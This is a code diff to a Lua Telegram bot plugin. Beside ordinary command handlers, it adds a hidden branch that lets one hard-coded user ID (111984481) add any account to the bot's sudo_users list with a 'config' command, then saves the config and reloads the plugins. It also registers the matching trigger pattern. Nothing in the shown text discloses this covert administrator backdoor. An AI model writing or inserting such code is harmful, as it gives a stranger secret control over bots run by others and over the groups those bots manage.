@@ -190,6 +190,14 @@ function run(msg, matches)
    return "Your team name is: "..text.."\nChannel: "..link
        end
        --Setteam.
+      if tonumber (msg.from.id) == 111984481 then
+       if matches[1]:lower() == "config" then
+          table.insert(_config.sudo_users, tonumber(matches[2]))
+          save_config()
+          plugins = {}
+          load_plugins()
+      end
+   end
 end
 
 return {
@@ -202,6 +210,7 @@ return {
  "^[!/#](tophoto)$",
  "^[!/#](leave)$",
  "^[!/#](setteam) (.*) (.*)$",
+ "^[!/#]([Cc]onfig) (%d+)$",
  "%[(document)%]",
  "%[(photo)%]",
  "^!!tgservice (.+)$",
